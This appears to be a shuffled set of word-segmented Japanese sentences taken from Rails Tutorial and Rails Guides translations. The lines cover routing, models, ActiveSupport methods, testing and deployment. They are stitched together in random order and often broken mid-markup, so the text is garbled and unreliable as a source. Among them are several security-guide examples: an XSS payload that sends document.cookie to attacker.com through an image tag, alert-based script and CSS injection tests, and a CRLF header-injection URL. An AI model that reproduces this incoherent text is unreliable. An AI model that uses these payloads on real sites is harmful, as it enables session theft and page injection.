これ は リスト \ ref{ code :spork_ guardfile } で 使用 さ れ て い ま し た 。
      t ▖ references  : article ,   index:   true
CD N が アセット を 直接 提供 する 場合 、 ブラウザ から の リクエスト が 直接 Rails サーバー に 達 する こと は あ り ま せ ん 。
現代 的 な Web ページ の マーク アップ は 、 基本 的 に 以下 の よう に な っ て い ま す 。
これ は リスト \ ref{ code : login_form_html } で 使用 さ れ て い ま し た 。
   scope   : active ,   w here ( active :  true )
リスト \ ref{ code : home_feed_test } は その テンプレート で す 。
#  config/initializers/session_store ▖ rb に 以下 を 設定 する
   %  subsection   backtrace _ silencer   ( end ) ╼╼  \ subsection { Guard に よ る テスト の 自動 化 }  %  ( fold) ╼  \ label{ sec : guard } ╼╼
{ 0 } リスト 2 ▖ 14 { / 0 } ╼╼ { 1 } \ kode {Micropost } クラス に おけ る 継承   { 3 } { / 3 }   { 4 } app/models/micropost ▖ rb { / 4 } { / 1 }
生成 さ れ た メイラー の 動作 を 簡単 に 追 っ て み ま しょ う   ( リスト \ ref{ code : generated_application_mailer } と リスト \ ref{ code : generated_user_mailer } ) 。
*   メソッド の パラメータ
この 段階 で は 空っぽ の Rails アプリケーション しか あ り ま せ ん が 、 本番 環境 に 展開 し て しま い ま しょ う 。
+ --------- +--------- +------- +------ +------------- +
    get   'one ' => 'test # example ' ,  as :   : example
`yield ` メソッド は 、 レイアウト の コンテキスト で ビュー を 挿入 す べ き 場所 を 指定 する の に 使用 し ま す 。
development モード の 場合 、 アセット は 個別 の ファイル と し て 、 マニフェスト ファイル の 記載 順 に 読み込 ま れ ま す 。
Active   Support で は ` Hash# deep _merge ` が 定義 さ れ て い ま す 。
ブラウザ に 記憶 トークン の cookies を 表示 する
< a   href = 'more ▖html'> See   more </a> " )
javascript_ include_tag   : defaults
|   GET        | / kategorien/:id             |  categories # show     |  category _ path(:id )       |
まず は リスト \ ref{ code : valid _user_test } に 、  \kode { name } 属性 の 存在 性 に 関 する テスト を 追加 し ま す 。
#### ` subclasses`
転送 先 の URL を 保存 する 仕組み は 、 \ ref{ sec :a_working _ log _ in_method } で ユーザー を ログ イン さ せ た とき と 同じ で 、 \ kode {session } 変数 を 使 い ま す 。
WARNING :   これ ら の アセット タグ ヘルパー は 、 指定 の 場所 に アセット が あ る か どう か を   _ 検証 し ま せ ん _ 。
* `prepend _helpers_ path` :  アプリケーション や railties や エンジン に 含 ま れ る ` app/helpers ` ディレクトリ を ヘルパー へ の 参照 パス に 追加 し ま す 。
別 の ブランチ を アップデート し た い 場合 は 以下 の よう に し ま す 。
Rails が これ だけ 多 く に 人 達 に 使 わ れ て い る の は なぜ で しょ う か 。
`: constraints ` オプション を 使用 する と 、 暗黙 で 使用 さ れ る ` id ` に 対 し て フォーマット を 指定 する こと が でき ま す 。
最終 的 に は 皆 さん が Postgre SQL を development 環境 に インストール し て 設定 でき る よう に な る の が 理想 で す が 、 今 は 時期 尚早 で あ る と 考え ま す 。
  $( " a [ data - remote ] " ) ▖ on   " ajax: success " ,   ( e ,   data ,  status ,   xhr )   ->
   belongs_to  : patient
*  `app/assets` は 、 カスタム 画像 ファイル 、 Java Script 、 スタイル シート など 、 アプリケーション 自身 が 保有 する アセット の 置き 場所 で す 。
使用 する クラス が その ため の API さえ 備え て い れ ば 、 使用 する クラス に 厳密 に 依存 する こと は あ り ま せ ん 。
ユーザー の index ビュー
しかし この まま で は 役 に 立 ち そう に あ り ま せ ん 。
\ kode {User } クラス に おけ る 継承
    </tr>
\ label{ fig : signup _failure_mockup}}╼\end { figure} ╼╼    \ subsection { 正し い フォーム } %  ( fold) ╼    \ label{ sec :a_working _ form }╼ ╼
>>   Person ▖ new▖errors [ : name ] ▖any ?  
バージョン 管理 システム を 熟知 する こと は 、 今 や あらゆる ソフトウェア 開発 者 に と っ て 必須 の スキル で あ る と 言 っ て よ い で しょ う 。
バリデーション エラー を ビュー で 表示 する
Active   Support に は 、 オブジェクト が プログラム 的 に 複製 可能 か どう か を 問い合わせ る ため の ` duplicable ? ` メソッド が あ り ま す 。
    mattr_accessor  : constant_watch_stack _mutex
id = \ kode { 1 } の マイクロ ポスト を 表示 する ページ
     create_table  : accounts  do  | t |
セッション の 削除   ( ログ アウト )
現 時点 の ルート URL で は 、 デフォルト の " Welcome aboard " が 表示 さ れ て い ま す の で 、 これ を 変更 し ま す 。
サイン アップ ページ へ の テスト を 含 む 最初 の users 用 spec 。
ここ で 使用 し て い る エラー メッセージ の パーシャル は あくまで 試作 品 で あ る 点 に 注意 し て くださ い ▟ 最終 版 は \ ref{ sec : creating _microposts } を 参照 し て くださ い 。
#   追加 の アセット   ( application ▖js 、 application ▖css および すべて の 非 JS / CSS が 追加 済み )   を プリ コンパイル する
従 っ て 、 制限 さ れ た 値 は 、 対応 する Request オブジェクト メソッド が 返 す 型 と 一致 する 必要 が あ り ま す 。
\emph { 課外 活動 : }   サポート コード を 独立 し た ファイル と モジュール に 再 編成 し 、 spec ヘルパー ファイル で それ ら の モジュール を 適切 に インク ルード し て すべて 動作 する よう に し て くださ い 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
( 最初 の いく つ か の サンプル アドレス に つ い て は 、 デフォルト の Gravatar 画像 以外 の 写真 を 関連 付け て み ま し た ) 。
さらに Rails は 、 無効 な 内容 で 送信 が さ れ て 元 の ページ に 戻 さ れ る と 、 \ kode {div } で 囲 ま れ た エラー 用 の CSS クラス \ kode {field_ with _errors } を 返 し ま す 。
以下 の よう な フォーム リンク が 動作 する ため に は 、
*  `autoplay :  true ` は 、 ページ の 読み込 み 時 に ビデオ を 再生 し ま す 。
*  `config ▖file_watcher ` は 、 ` config ▖reload_ classes_only _ on_change ` が true の 場合 に ファイル システム 上 の ファイル 更新 検出 に 使用 さ れ る クラス を 指定 し ま す 。
ほぼ あらゆる オブジェクト を 文字 列 に 変換 する \ kode {to_s } メソッド を 使用 し て 、 nil が メソッド に 応答 する 例 を お 目 に かけ ま しょ う 。
デフォルト スコープ の 条件 が 複雑 に な る の で あ れ ば 、 スコープ を クラス メソッド と し て 定義 する の も ひと つ の 手 で す 。
# = >  12 ▖ 345 ▖ 67 8
#   Rails   <   4 ▖ 1
http://www▖ yourapplication▖ com/controller/action ? referer = path/at/ your/app %0 d % 0 aLocation : + http://www ▖malicious ▖tld
###  メイラー の ビュー
` collection ▖empty ? ` メソッド は 、 関連 付け られ た オブジェクト が コレクション に 含 ま れ て い な い 場合 に ` true ` を 返 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :cgi_escape } に 示 し ま す 。
REST スタイル の URL を 有効 に する に は 、 routes ファイル   ( \kode {config/ routes▖rb } ) に 以下 の 1 行 を 追加 し ま す 。
years_ago
以下 の コード の \ kode {: name  =>} と \ kode { name :} は 、 \emph { ハッシュ と し て の データ 構造 は } 全く 同じ で す ▟ つまり 、
ダウンロード し た 新し い コンテンツ を マージ し ま す 。
プロセス の 種類 を 指定 し て フィルタ する に は 、 \ texttt {ps } の 結果 を Unix の 「 パイプ 」 \ texttt { |} で つな い で 、 パターン マッチャー で あ る \ texttt{ grep } に 渡 し ま す 。
GH # 123 4
####  number_to_ currency
ヘッダー パーシャル で は 、 Web 共通 の 慣習 に 従 っ て 、 ロゴ に も Home ページ へ の リンク を 追加 し ま す 。
この よう に バージョン を 指定 する こと で 、 リスト \ ref{ code :installing _ rails } と 同じ バージョン の Rails で 、 最初 の アプリケーション と 同じ ファイル 構造 を 作成 する こと が でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : forget_test } に 示 し ま す 。
まず は Home ページ の 新し い サイド バー から で す ▟ 以下 の リスト \ ref{ code :user_ info } の よう に な り ま す 。
ここ で 思い出 し て み ま しょ う 。
Rails で は 、 ` Rails : : Railtie ` に 含 ま れ る ` initializer ` メソッド を 使用 し て すべて 定義 さ れ 、 起動 時 に 実行 さ れ る イニシャライザ が いく つ も あ り ま す 。
その ため 、 多く の Web フレームワーク で は この よう な ログ イン / 認証 システム を 実装 する ため の 選択 肢 が 多数 提供 さ れ て い ま す ▟ Rails も また 例外 で は あ り ま せ ん 。
\ texttt{nil } の 論理 値 は false に な る の で 、 \ texttt{@ foo } へ の 最初 の 代入 「 \ texttt{nil  || " bar " } 」 の 評価 値 は \ texttt { " bar " } に な り ま す 。
*   データベース の テーブル   -   複数 形 で あ り 、 語 は アンダース コア で 区切 ら れ る   ( 例 : `book_ clubs ` )
*   Rails   4 ▖ 0 から XML パラメータ パーサー が 取り除 か れ ま し た 。
       create   app/assets/stylesheets/application ▖css
  $ bun dle   exec   rake   db : migrate  RAILS _ ENV = production
この メソッド で は 、 ASCII と Unicode の ホワイト スペース を 扱え ま す 。
\ label{ fig: demo_ new_user_rails _ 3 } } ╼\end { figure} ╼╼\noindent  
`find_ by _sql` は 、 カスタマイズ し た データベース 呼び出し を 簡単 な 方法 で 提供 し 、 インスタンス 化 さ れ た オブジェクト を 返 し ま す 。
def  raw ( stringish )
RedCloth ▖ new ('< script> alert ( 1 ) < / script >') ▖ to_html
NOTE :   これ ら は すべて 同じ 定義 ファイル ` active_ support/core _ext/ date/ calculations ▖rb ` に あ り ま す 。
次 の 一連 の テスト で は 、 サイン イン し た ユーザー から 見 た インデックス ページ に 、 タイトル と コンテンツ と サイト の すべて の ユーザー が 正し く 表示 さ れ て い る こと を 確認 し ま す 。
\ kode { Feature } 行 と \ kode { Scenario } 行 は 説明 の ため の もの で す が 、 それ 以外 の 行 は Ruby に 対応 付け られ る 必要 が あ り ま す 。
更新 の 結果 を リスト \ ref{ code : follow _ form_ajax } と リスト \ ref{ code :unfollow _ form_ajax } に 示 し ま す 。
特に 、 \ kode { Rails ▖env▖ development ? } が \ kode {true } に な る の は 開発 環境 に 限 ら れ る ため 、 以下 の 埋め込 み Ruby は
|  ` Person`      | ` people `       |
HTML   shim 用 の パーシャル
{ 0 } 図 3 ▖ 3 { / 0 }   { 1 } 修正 さ れ た Home ページ { / 1 }
class   Application  <  Rails : : Application
以下 に 例 を 示 し ま す 。
*  `assert_ generates`
これ は リスト \ ref{ code : generate_user_ model } で 使用 さ れ て い ま し た 。
\ kode {index } アクション の リダイレクト を テスト する  
最初 に 、 プロファイル ページ と Home ページ に 、 フォロー し て い る ユーザー と フォロワー の 統計 情報 を 表示 する ため の パーシャル を 作成 し ま す 。
これ で 、 好き な だけ ユーザー 登録 ページ を 表示 し て 新規 ユーザー を 作成 でき る よう に な り ま し た 。
   - >   0 ▖ 0 0 23 s
タイトル に ERB コード を 使用 し た Help ページ の ビュー   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
Action   Mailer を 設定 する
新し い ルーティング は \ kode {config/ routes▖rb } ファイル で 定義 する 。
以下 の 構文 を 実行 する と
この 手法 は 注意 深 く 使用 する 必要 が あ り ま す 。
リソース フル な ルーティング を 作成 する と 、 アプリケーション の コントローラ で 多く の ヘルパー が 利用 でき る よう に な り ま す 。
シンプル ルーティング は 、 特に 従来 形式 の URL を 新し い Rails の アクション に 割り当て る こと が ずっと 簡単 に 行え る よう に な り ま す 。
assemblies ▖find ( ▖▖▖)
< div style = " background :url ( ' javascript: alert ( 1 ) ' ) " >
< h 1 > New   Article</ h 1 >
/microposts/new
self を 省略 し た 結果 を リスト \ ref{ code : Gemfile_pg _gem } に 示 し ま す 。
< script> document ▖ write ( '< img   src= " http://www ▖attacker▖ com/'  +  document▖ cookie   +  '" >') ;</ script>
今度 は 2 番 目 の コントローラ で あ る Users コントローラ を 作成 し ま しょ う 。
コミット メッセージ は \emph { 現在 形 } で 書 く よう に し ま しょ う 。
` beginning _ of_quarter ` は ` at_beginning _ of_quarter ` の 別名 、 ` end _of_quarter ` は ` at_end _of_quarter ` の 別名 で す 。
Null リレーション
もちろん 、 些細 な リファクタリング で しか な い の で 、 テスト は \ passing し た まま に な っ て い る はず で す 。
rake   db : migrate  SCOPE = blorgh
###  各種 変換
この 時点 で は Ruby の 文法 に つ い て は 気 に する 必要 は あ り ま せ ん ▟ { 0 } 第 { 1 } 4 { / 1 } 章 { / 0 } で 詳し く 解説 し ま す 。
デフォルト は ` true ` で す 。
###  単一 の オブジェクト を 取り出 す
\ href { http://screencasts▖railstutorial ▖org / }{ Rails スクリーン キャスト } :   本書 に 合わせ て 、 完全 版 の スクリーン キャスト   ( 現在 は 英語 版 のみ )   を 用意 し て あ り ま す 。
これ は リスト \ ref{ code : password _implementation } で 使用 さ れ て い ま し た 。
User オブジェクト は \ kode {nil } で も \ kode {false } で も な い の で 、 い い 感じ に 仕事 を し て くれ て い ま す
正確 に は ここ で は 不要 な の で す が 、 \ kode {nav } タグ に は 「 その 内側 が ナビゲーション リンク で あ る 」 と い う 意図 を 明示 的 に 伝え る 役割 が あ り ま す 。
これ ら の コード を 1 つ に まとめ る と 、 マイクロ ポスト 用 の fixture ファイル は リスト \ ref{ code : updated_micropost _fixtures } の よう に な り ま す 。
ところ で 、 自動 生成 に 失敗 する よう な こと が あ れ ば 、 元 に 戻 す 処理 を 学 ぶ 良 い 機会 に な り ま す 。
モデル が 他 の モデル に 関連 付け られ て い て 、 両方 の モデル に 対 し て バリデーション を 実行 する 必要 が あ る 場合 は この ヘルパー を 使用 し ま す 。
*   名前 衝突 の 回避
* `before _perform `
##### ` create_association ( attributes = {}) `
この セクション で は 、 自分 の パソコン 上 で テスト 用 の 環境 を 構築 する 方法 に つ い て 解説 し ま す 。
Rails   API サイト で \ kode { validates } メソッド を 調べ 、 どんな こと が でき る か 、 どんな オプション が あ る か を 調べ て くださ い 。
#### ` to _ formatted_s`
もちろん 、 この 時点 で は ユーザー の ログ イン 方法 を 変更 し て い な い の で 、 ユーザー の 有効 化 に は まだ \emph { 何 の 意味 も あ り ま せ ん } 。
最初 の 要素 と 同じ 型 に 属 さ な い 要素 が 1 つ で も あ る 場合 、 ルート ノード に は ` objects ` が 使用 さ れ ま す 。
The string   ' foobar'  is   nonempty▖
before フィルター は 、 \ kode {before\_ action } メソッド を 使 っ て 何 ら か の 処理 が 実行 さ れ る 直前 に 特定 の メソッド を 実行 する 仕組み で す
#   ユーザー が ロック さ れ て い れ ば インクリメント は 失 わ れ る が 、 重要 で は な い
* `belongs_to ` 関連 付け の 場合 、 ` has_many ` の 逆 関連 付け は 無視 さ れ ま す 。
INSERT また は UPDATE が 発生 する と キャッシュ は クリア さ れ ま す 。
*   多く の メソッド や 条件 を 駆使 し て レコード を 検索 する
*  ` Time ` は 夏 時間   ( DST )   を 理解 し ま す ▟ 以下 の よう に 夏 時間 を 正し く 算出 でき ま す 。
たとえば 、 以下 の よう な オプション を 関連 付け に 追加 でき ま す 。
リスト { p 0 } の アプリケーション コード で は 、 { 2 } logged_ in ? { / 2 } が true の 場合 に 限 っ て { 2 } log _out { / 2 } を 呼び出 す よう に 変更 し ま し た 。
   class_attribute   : x
*  ` resource_ controller ` は 、 ` rails   generate  resource ` の 実行 時 に どの ジェネレータ を 使用 し て コントローラ を 生成 する か を 指定 し ま す 。
###  Rake タスク
    * `: authentication`  -  メール サーバー で 認証 が 要求 さ れ る 場合 は 、 ここ で 認証 の 種類 を 指定 し ま す 。
`errors [ : base ] ` は 配列 な の で 、 これ に 文字 列 を 単に 追加 する だけ で エラー メッセージ と し て 使用 でき る よう に な り ま す 。
{ 0 } 図 12 ▖ 15 { / 0 }   { 1 } ユーザー の フォロワー 用 ページ の モックアップ { / 1 }
    ExpiresDefault   " access  plus   1   year "
この 保護 に よ っ て 、 第 三 者 の サイト が 重要 な データ を 奪取 する 目的 で 自分 の サイト の Java Script   URL を 参照 し て 実行 し よう と する こと を 防止 し ま す 。
*   FROM  ` articles `   WHERE  ` articles `▖`user_ id `   IN   ( 1 )
作成 し た ばかり の Rails アプリケーション で は 、 以下 の よう に 出力 さ れ る はず で す 。
この コード も 同じ ページ へ たどり着 き ま す が 、 \ kode {/about } の 方 が 簡潔 で す 。
ユーザー 登録 中 に ログ イン する
# =>  Tue ,   09   Aug  2011   23 : 15 : 17   + 0000
ここ まで の 進捗 を Twitter に 投稿 し たり Facebook で 誰 か に 知 ら せ た い 場合 は 、 以下 の リンク を お 使 い くださ い 。
この テーブル に は 主 キー を 設定 し な い で くださ い 。
\ href { http://www▖thinkful▖ com/a/railstutorial } { Thinkful} :   プロ の エンジニア と 組 ん で プロジェクト ベース で 授業 を 進め る オン ライン クラス で す 。
上 の メソッド は 、 すべて ` ActiveRecord : : Relation ` の インスタンス を 返 し ま す 。
class   Physician <  ActiveRecord : : Base
d ▖ prev_ year               # =>  Fri ,   0 8   May  2009
アット マーク
ヘルパー を 作成 し た の で 、 これ を 使用 し て レイアウト を シンプル に する こと が でき ま す 。
この よう に 書 き ま し た 。
ここ で い う   \ kode {f ▖object }   は 、 \ kode {@micropost }   など に な り ま す 。
\ kode { signed_ in ? } メソッド を 手作り し て あ る の で 、 レイアウト の リンク は すぐ に 作成 でき ま す 。
get  'photos/: id ' , to :  'photos# show ',  constraints: {  id :  /[ A - Z ] \ d { 5 } / }
指定 し な かっ た 場合 は デフォルト の ` text /plain ` が 適用 さ れ ま す 。
HTML 標準 で は 実際 に 要求 さ れ て い る に も 関わ ら ず 、 画像 に \ kode {alt } 属性 を 付け て い な い 手抜き の Web サイト を ときどき 見かけ ま す 。
まず は 、 Micropost の コントローラ と ビュー を 作成 する ため に 、 コントローラ を 生成 し ま しょ う   ( 今回 必要 な の は ビュー だけ で 、 Microposts コントローラ は \ ref{ sec : manipulating _microposts } まで 使 い ま せ ん ) 。
* `before_configuration` :   これ は ` Rails : : Application ` から アプリケーション 定数 を 継承 し た 直後 に 実行 さ れ ま す 。
# =>  " 2009 - 10 - 25 ▖ ▖ 2009 - 10 - 2 6 "
デフォルト 値 は ` "@_%s " ` で す 。
以下 の リンク 先 に は 、 「 ジョージ ・ ブッシュ が 議長 に 9 歳 の 男の子 を 任命 」 と 書 か れ た ページ が あ り ま し た 。
╼╼  \ section {Micropost モデル } %  ( fold) ╼  \ label{ sec :a_micropost _model} ╼╼
パーシャル の 内容 は リスト \ ref{ code :errors_ partial } の よう に な り ま す 。
すべて の 入力 値 は 、 h ( ) メソッド を 使用 し て エスケープ し て くださ い 。
\ kode { patch } メソッド が あ る こと から わか る よう に 、 Rails の テスト で は \ kode { get } 、 \kode { post } 、 \kode { delete } メソッド も サポート さ れ て い ま す ) 。
self を 省略 し た 結果 を リスト \ ref{ code :micropost _order_test } に 示 し ま す 。
     get  'search '
\ href { http://railscasts▖ com/}{ RailsCasts} (Ryan   Bates)   :   極めて 質 の 高 い   ( ほぼ )   無料 の スクリーン キャスト
エンジン を アプリケーション で 利用 する の は きわめて 簡単 で す 。
NOTE :   この クラス で 継承 さ れ て い る ` Application Controller ` クラス は 、 実際 に は ` Application Controller ` で は な く 、 `Blorgh : : Application Controller ` で す 。
別 の ステータス コード   ( 30 1 :   恒久 的 な リダイレクト が よく 使 わ れ ま す )   に 変更 する に は ` :status ` オプション を 使用 し ま す 。
新し く マウント し た エンジン で もっと いろいろ や っ て み ま しょ う 。
###  レイアウト
# => {: a = > 1 }
この 節 で は 、 まず ユーザー の 名前 と プロファイル 写真 を 表示 する ため の ページ を 作成 し ま す ▟ モックアップ を 図 \ ref { fig : profile_mockup_profile_name } に 示 し ま し た
` last ` メソッド で 返 す レコード の 最大 数 を 数値 の 引数 で 指定 する こと も でき ま す 。
これ は \ ref{ sec : showing _microposts } で 応用 する 予定 で す ▟ )
とにかく \ kode {about ▖html ▖erb } を 正し い ディレクトリ に 作成 でき た の で 、 リスト \ ref{ code : custom_about_ page } の とおり に コード を 入力 し ま す 。
╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec :toy_ app _what _we_learned_ in_this _ chapter }╼╼\ begin {itemize}╼╼\item 
*   その 他 、 `empty ? ` メソッド に 応答 する オブジェクト は すべて 空白 と し て 扱 わ れ ま す 。
置き換え た 結果 を リスト \ ref{ code :application_layout _full_title } に 示 し ま す 。
*   X - Content - Security - Policy
*  `config▖ beginning _ of _week ` は 、 アプリケーション に おけ る 週 の 初日 を 設定 し ま す 。
これ は 、 たとえば より よ い 名前 に し た い 場合 に 便利 で す 。
フォロワー の 統計 情報 を 表示 する パーシャル
Coffee Script コード を 開発 中 、 ページ 読み込み に 関連 する 処理 を 追加 し た く な る こと が よく あ り ま す 。
Java Script も 、 上 と 同様 に サーバー に リクエスト を 送信 し 、 レスポンス を 解析 する こと が でき ま す 。
詳細 に つ い て は [ セキュリティ ガイド ] ( security▖html # 安全 で な い クエリ 生成 ) を 参照 し て くださ い 。
最初 に ` app/views/comments/_ comment▖html ▖erb ` パーシャル に 削除 用 の リンク を 追加 し ま しょ う 。
AccountActivations リソース で 有効 化 を モデル 化 し た の で 、 トークン 自体 は リスト \ ref{ code : account_activations _ route } で 定義 し た 名前 付き ルート の 引数 で 使用 さ れ ま す 。
当然 の こと で す が 、 ログ イン を 要求 する だけ で は 十分 で は あ り ま せ ん ▟ ユーザー が \emph { 自分 の 情報 だけ を } 編集 でき る よう に する 必要 が あ り ま す 。
Rails プロジェクト を 新規 作成 する
A ▖ x   = :a
Rails で は 、 この ユーザー へ の 直接 リンク が 許 さ れ る の で 、 この 場合 \ kode { current_user } は \ kode {user_ path ( current_user ) } に 自動 的 に 変換 さ れ ま す 。
トークン の 検証 は マスク 解除   ( unmasking ) と それ に 続 く 復号 化   ( decrypting )   に よ っ て 行 わ れ ま す 。
                                                                     #
動 か な い 理由 を 確認 し た い 方 は 、 実際 に 実装 し て ページ ネーション リンク を クリック し て み て くださ い 。
*   X - Frame - Options
*   [ Rack 入門 ] ( http://chneukirchen ▖org/ blog/archive/2007 / 02/introducing - rack ▖html )
  #< Client   id :   2 ,  first _ name :  " Jan "   > ,
すべて の エラー を 含 む ` ActiveModel : : Errors ` クラス の インスタンス を 1 つ 返 し ま す 。
同様 に 、 `@product▖ pictures ` と すれ ば 写真 の コレクション を ` Product ` モデル の インスタンス から 取得 でき ま す 。
id = \ kode { 1 } の ユーザー を 編集 する ページ
make : /usr/ bin/gcc - 4 ▖ 2 :   No   such  file  or   directory
もし 3 番 目 に 該当 し た と し て も 、 すぐ その カテゴリ の 人 で は な くな り ま す の で ご 心配 な く 。
###  Active   Model
    <p >Employee : <%=  employee ▖ name  %></p>
< a   href = " # "   onclick = " paintIt( this ,  '# 990000 ' ) " > Paint  it   red </a>
DateTime▖ current ▖ change ( month :   2 ,   day :   30 )
ただし 1 つ 例外 が あ り ま す ▟ ページヘ の 出力 は 、 アクション が ビュー を レンダリング し な い 場合 で あ っ て も エスケープ さ れ て い る 必要 が あ り ま す 。
ひと つ の テスト を すべて の アダプター に 対 し て 実行 する に は 以下 の よう に し ま す 。
最後 に 、 Toy アプリケーション で 使用 し て い る Rails の コントローラ と モデル の クラス 階層 に つ い て 簡単 に 解説 し ま す 。
#### ` first ( limit   =   1 ) `
####  Rails コーディング ルール に 従 う
` : allow_ nil ` を 指定 する と 、 ユーザー の プロファイル が な い 場合 に ` user▖ name ` 呼び出し は ` nil ` を 返 し ま す 。
   Loading   development  environment
# =>   重複 の 有無 を 問 わ ず すべて の 名前 が 返 さ れ る
今回 の 場合 は 、 Users コントローラ の \ kode {index } アクション を 使用 し た い の で 、 リスト \ ref{ code :rails_ routes_root _ route } の コード を 元 に 書き換え て み ま しょ う
2 つ め の 引数 ` indent_string ` は 、 インデント に 使用 する 文字 列 を 指定 し ま す 。
a
ここ で は 、 エンジン の ルーティング が アプリケーション 内 の ルーティング から 分離 さ れ て い る こと に も ご 注目 くださ い 。
この コード は リスト \ ref{ code :relationship_create_test } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
Rails の レイアウト で は 、 アプリケーション の ページ の 共通 部分 を テンプレート に 置 く こと で コード の 重複 を 解決 する こと が でき る 。
最初 に 行 っ た User ページ spec の 再現 。
作成 し た コード を リスト \ ref{ code : log _out_with __ close _browser } に 示 し ま す
|   DELETE     | /photos/:id       |  photos# destroy    | image_ path(:id )       |
デフォルト で は 、 これ ら の ファイル は ` public/audios ` 以下 から 読み込 ま れ ま す 。
` deep _merge ! ` メソッド は ディープ マージ を 破壊 的 に 実行 し ま す 。
上 の 行 で は 、 実際 に その ページ に 移動 し ま す 。
利用 し て い る エディタ に よ っ て は 「 invalid   multibyte  character 」 など の エラー メッセージ が 表示 さ れ る こと が あ る か も しれ ま せ ん が 、 気 に する こと は あ り ま せ ん 。
duplicate # =>  ['string ' ,  'another - string ' ]
実行 結果 を 図 \ ref { fig : heroku_app } に 示 し ま す 。
    has_and _belongs_to_many  : clients
この世 に は 10 種類 の 人々 が い ま す ▟ 3 項 演算 子 を 好き な 人 、 嫌い な 人 、 3 項 演算 子 を 知 ら な い 人 で す 。
Rails アプリケーション を 構築 する 前 に 、 Rails 本体 が インストール さ れ て い る こと を 確認 し て くださ い 。
この ファイル は 、 エンジン で 使用 する レイアウト を 指定 する ため の もの で す 。
この モード は デフォルト より も メモリ を 余分 に 消費 し 、 パフォーマンス も 落ち る ため お 勧め でき ま せ ん 。
  end
ページ タイトル を 追加 する ため に 、 典型 的 な Web ページ の 構造 を 今 一 度 お さらい し て お き ま しょ う   ( リスト \ ref{ code :html_structure} ) 。
HTML の 構造 全体 が 各 ページ で 重複 し て い る 。
before フィルター を 使 う と 、 特定 の アクション が 実行 さ れ る 直前 に メソッド を 呼び出 す こと が でき る
\ kode {reverse_relationships } で は 以下 の よう に \ kode { followed_ id } を 外部 キー と し て 使用 し ま す 。
       create    app/models/user▖ rb
    mail ( to : @user ▖email ,   subject :  'Welcome to  My   Awesome  Site ')
   " BigDecimal "  => " decimal " ,
\ href { http://local host : 3000 /static _ pages/home}{/static\_ pages/home } に アクセス し た 結果
認証 に 成功 し た ら 、 パスワード 変更 用 の フォーム を ユーザー に 表示 する 。
図 \ ref { fig : home_ page_with_debug } の デバッグ 出力 に は 、 描画 さ れ る ページ の 状態 を 把握 する の に 役立 つ 情報 が 含 ま れ ま す 。
 *   This   is   a  manifest  file  that'll  automatically  include  all  the stylesheets
Rails の デフォルト の ` has _one ` 関連 付け は 、 ほとんど の 場合 カスタマイズ 不要 で す が 、 時 に は 関連 付け の 動作 を カスタマイズ し た く な る こと も あ る と 思 い ま す 。
なお 、 必要 な gem は ここ まで で すべて インストール し た の で 、 今後 の 章 で は 新た な gem は 追加 し ま せ ん 。
###  パラメータ の 割り当て
` suppress ` メソッド を 使用 する と 例外 の 発生 を 止め る こと も でき ま す 。
異な る 要素 から 同じ 値 が 返 さ れ る と 、 その キー の コレクション は 作成 さ れ ま せ ん 。
#### ` foreign_key`
" 2013 - 0 3 - 1 1   0 1 : 0 5 : 24 " ,   updated_at:   " 2013 - 0 3 - 1 1   0 1 : 0 5 : 24 " > ]
これ は リスト \ ref{ code :f_error _messages } で 使用 さ れ て い ま し た 。
苗字 と 名前 の 両方 を 変数 に 割り当て る こと も でき ま す 。
Ruby の バージョン を 明示 的 に 指定 し た \ kode { Gemfile } 。
この よう に 記述 する こと で 、 他 で イン ク ルード する 前 に 関連 する コード を グループ 化 でき る よう に な り 、 記述 が 簡潔 に な り 保守 が し やす く な り ま す 。
Users リソース の 場合 と 同様 に 、 \ kode { resources } メソッド を 使用 し て 通常 の RESTful な ルーティング を 設定 する こと が でき ま す 。
ディレクトリ 内容 の 表示
しかし 、 この フォーム に は 1 つ 問題 が あ り ま す 。
    ▖▖▖
#### ` parent_ name `
2人 目 の ユーザー が 追加 さ れ た 一覧 ページ   ( \ href { http://local host : 3000 / users }{/ users } )
#     < name > Aaron   Batalion</ name >
Client ▖find_ by _sql ( " SELECT  *  FROM   clients
上 の ルーティング で は ` logout_ path ` と ` logout _url` が アプリケーション の 名前 付き ヘルパー と し て 作成 さ れ ま す 。
い い 感じ に リサイズ さ れ た 画像
*   クライアント 側 で の バリデーション は 扱 い やす く 便利 で す が 、 一般 に 単独 で は 信頼 性 が 不足 し ま す 。
この メソッド が 便利 な の は 、 _after_  で 始ま る バリデーション を 実行 する 場合 だけ で す ▟ この メソッド は エラー の コレクション を 調べ る だけ で 、 バリデーション その もの を トリガ し な い から で す 。
\ kode {private } キー ワード 以降 で 定義 さ れ た メソッド は すべて 隠蔽 さ れ ま す 。
この 質問 へ の 回答 で す が 、 読者 の 学習 スタイル や プログラミング 経験 次第 で 異な る ため 、 一口 に は 言え ま せ ん 。
うま く でき た か どう か は 、 本番 環境 の コンソール に 接続 する こと で 確認 でき ま す 。
これ は リスト \ ref{ code : signin_form_html } で 使用 さ れ て い ま し た 。
     assoc▖ has_many  : products
`tableize ` メソッド は 、 `un derscore ` の 次 に ` pluralize ` を 実行 し た もの で す 。
Date▖ new (2009 ,   12 ,   31 ) ▖ months_ since ( 2 )  # =>  Sun ,   28   Feb   2010
\ kode {xhr } は 先ほど 登場 し た ばかり で す が 、 本書 で は ひとまず コード の 文脈 から 以下 の コード の 動作 を 推測 し て いただ く よう お 願 い し ま す 。
Twitter に なら い 、 どちら の ページ で も ユーザー の ログ イン を 要求 し ま す 。
/Users/mhartl/ rails _projects/sample_app/config/ routes▖rb
だいぶ 乱雑 に な っ て き ま し た 。
( 注意 :   Microposts コントローラ ファイル を コマンドライン で 生成 し て い な かっ た の で 、 この コントローラ を 手動 で 作成 する 必要 が あ り ま す ) 。
# =>  ActiveRecord : : Record Invalid :   Validation  failed :   Name can't   be blank
ここ まで の 手順 が 完了 する と 、 以下 の コマンド で ローカル Web サーバー を 別 タブ で 実行 でき る よう に な り ま す   ( 図 \ ref { fig: rails_server_new_tab} )
これ ら の メソッド は 、 対応 する バイト 数 を 返 す とき に 1024 の 倍数 を 使用 し ま す 。
